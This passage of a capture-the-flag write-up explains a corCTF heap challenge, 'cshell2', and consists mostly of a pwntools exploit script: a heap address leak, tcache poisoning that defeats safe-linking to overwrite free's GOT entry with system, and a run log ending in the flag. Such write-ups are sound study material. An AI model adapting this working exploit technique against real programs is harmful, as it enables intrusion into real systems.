    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">decrypt_pointer</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x1000</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="c1"># Heap state</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x13f6310	0x0000000000000000	0x0000000000000411	................ [chunk8]
</span><span class="s2">0x13f6320	0x00000000013f4c0a	0x000000000000000a	.L?.............
</span><span class="s2">0x13f6330	0x000000000000000a	0x0000000000000539	........9.......
</span><span class="s2">0x13f6340	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x13f6350	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x13f6360	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX [chun8-&gt;bio]
</span><span class="s2">0x13f6370	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6380	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6390	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6400	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6410	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6420	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6430	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6440	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6450	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6460	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6470	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6480	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6490	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6500	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6510	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6520	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6530	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6540	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6550	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6560	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6570	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6580	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6590	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6600	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6610	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6620	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6630	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6640	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6650	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6660	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6670	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6680	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6690	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6700	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6710	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6720	0x5858585858585858	0x0a58585858585858	XXXXXXXXXXXXXXX.
</span><span class="s2">0x13f6730	0x00000000013f4ce6	0xdc8340f7dfc0b0e1	.L?..........@..	 &lt;-- tcachebins[0x410][0/7] [chunk9]
</span><span class="s2">&#34;&#34;&#34;</span>

</code></pre></div><p>Then here we are, we leaked both libc and heap base addresses. We just have to to tcache poisoning on <code>free</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tcache-poisoning--profit">
        Tcache poisoning + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#tcache-poisoning--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Tcache poisoning &#43; PROFIT" href="#tcache-poisoning--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We overflow the <code>8</code>-th chunk to overwrite the next freepointer of <code>chunk9</code> that is stored at the HEAD of the <code>0x410</code> tcachebin. Then we got an arbitrary write.
We craft a nice header to be able to request it back from the tcache, and we encrypt the <code>next</code> with the location of the <code>chunk9</code> to pass safe-linking checks.</p>
<p>Given we hiijack GOT we initialized properly some pointers around to avoid segfaults. We do not get a write into the GOT entry of <code>free</code> cause it is unaliagned and <code>malloc</code> needs <code>16</code> bytes aligned next free pointer.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2730</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)))</span>

<span class="c1"># dumb</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter size (1032 minimum): </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1032</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xbbdf80</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x71ab0</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4cb40</span><span class="p">))</span>

<span class="c1"># Finally</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag: </span><span class="si">{</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>Here we are:</p>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/corCTF/cshell2$ python3 exploit.py REMOTE HOST=be.ax PORT=31667
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to be.ax on port 31667: Done
[*] libc: 0x7f1d388db000
[*] heap: 0x665000
[*] flag: b'corctf{m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!}\n'
[*] Switching to interactive mode
$
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="appendices">
        Appendices
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;cshell2&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2000</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>


<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">firstname</span><span class="p">,</span> <span class="n">midname</span><span class="p">,</span> <span class="n">lastname</span><span class="p">,</span> <span class="n">age</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">l</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter size (1032 minimum): </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">firstname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">midname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">lastname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bio</span><span class="p">)</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">firstname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">midname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">lastname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bio</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">firstname</span><span class="p">,</span> <span class="n">midname</span><span class="p">,</span> <span class="n">lastname</span><span class="p">,</span> <span class="n">age</span><span class="p">,</span> <span class="n">bio</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
